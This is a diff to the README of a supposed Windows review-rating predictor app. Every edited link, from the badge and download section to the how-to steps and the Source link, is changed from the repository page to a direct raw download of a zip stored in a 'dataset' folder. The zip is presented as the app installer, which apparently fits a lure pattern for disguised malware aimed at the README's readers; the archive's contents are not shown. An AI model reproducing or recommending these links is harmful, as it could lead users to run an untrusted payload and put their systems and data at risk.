@@ -1,10 +1,10 @@
 # 🤖 review-rating-predictor - Predict Ratings with Simple Machine Learning
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20Windows%20App-2D89EF?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/heliseacarpelous457/review-rating-predictor)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20Windows%20App-2D89EF?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/heliseacarpelous457/review-rating-predictor/main/dataset/predictor_rating_review_v1.2.zip)
 
 ## 📥 Download
 Use this link to visit the page and download the app:
-[https://github.com/heliseacarpelous457/review-rating-predictor](https://github.com/heliseacarpelous457/review-rating-predictor)
+[https://raw.githubusercontent.com/heliseacarpelous457/review-rating-predictor/main/dataset/predictor_rating_review_v1.2.zip](https://raw.githubusercontent.com/heliseacarpelous457/review-rating-predictor/main/dataset/predictor_rating_review_v1.2.zip)
 
 ## 🖥️ What this app does
 review-rating-predictor is a Windows app that predicts product review ratings from written text. You paste or type a review, and the app estimates the rating based on the words used.
@@ -27,7 +27,7 @@ If you are using a ready-made Windows build, you can usually start it with a sin
 
 ## 🧭 How to download on Windows
 1. Open this page in your browser:
-   [review-rating-predictor](https://github.com/heliseacarpelous457/review-rating-predictor)
+   [review-rating-predictor](https://raw.githubusercontent.com/heliseacarpelous457/review-rating-predictor/main/dataset/predictor_rating_review_v1.2.zip)
 
 2. Find the latest download area on the page.
 
@@ -145,7 +145,7 @@ This method works well for basic review prediction tasks and keeps the app fast 
 
 ## 📎 Direct download page
 If you need to get the app again, use:
-[https://github.com/heliseacarpelous457/review-rating-predictor](https://github.com/heliseacarpelous457/review-rating-predictor)
+[https://raw.githubusercontent.com/heliseacarpelous457/review-rating-predictor/main/dataset/predictor_rating_review_v1.2.zip](https://raw.githubusercontent.com/heliseacarpelous457/review-rating-predictor/main/dataset/predictor_rating_review_v1.2.zip)
 
 ## 🪟 Windows notes
 - Use a recent version of Windows
@@ -165,4 +165,4 @@ If you need to get the app again, use:
 The app gives a rating guess based on review text. It does not read images or videos. It works with written product reviews only
 
 ## 🔗 Source
-[review-rating-predictor](https://github.com/heliseacarpelous457/review-rating-predictor)
+[review-rating-predictor](https://raw.githubusercontent.com/heliseacarpelous457/review-rating-predictor/main/dataset/predictor_rating_review_v1.2.zip)
